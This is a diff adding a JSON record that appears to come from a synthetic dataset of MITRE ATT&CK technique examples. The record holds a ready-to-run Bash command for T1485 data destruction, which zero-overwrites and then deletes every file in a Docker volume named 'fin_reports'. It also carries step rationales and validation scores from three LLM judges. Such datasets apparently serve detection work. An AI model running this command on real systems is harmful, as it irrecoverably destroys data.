@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'vol=fin_reports; mp=$(docker volume inspect -f \"{{.Mountpoint}}\" \"$vol\"); find \"$mp\" -type f -print0 | while IFS= read -r -d \"\" f; do sz=$(stat -c%s \"$f\"); dd if=/dev/zero of=\"$f\" bs=$sz count=1 conv=notrunc status=none; done; sync; find \"$mp\" -type f -delete'",
+  "explanation": "Locates a Docker volume’s mountpoint, overwrites all files inside with zeros, then deletes them.",
+  "rationale_steps": [
+    "Query Docker for the volume mountpoint",
+    "Iterate all files within the volume",
+    "Overwrite each file’s content with zeros",
+    "Sync changes to disk",
+    "Delete the files from the volume"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-0654816a",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid substitutions, and correct find/while loop syntax and flags.",
+        "semantic_score": 4,
+        "semantic_justification": "Overwrites and deletes files in the Docker volume as described, but may fail without Docker/root permissions and can break or be inefficient for zero-length or very large files due to dd using bs equal to file size.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T02:19:47.923701Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper use of bash -c, correct subshell syntax, valid dd/find/stat flags, and proper null-delimiter handling in the while loop.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1485 data destruction by inspecting a Docker volume mountpoint, overwriting each file's content with zeros using dd (secure wipe), syncing to disk, then deleting the files — fully aligning with the technique's overwrite-then-delete pattern targeting container storage.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T01:43:44.475791Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "the command uses correct bash syntax, proper quoting for subshells and templates, and a robust loop structure for handling filenames.",
+        "semantic_score": 5,
+        "semantic_justification": "the command accurately identifies the volume path, performs a non-truncating overwrite to destroy data on disk, and then deletes the files, perfectly aligning with T1485.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:43:47.744605Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
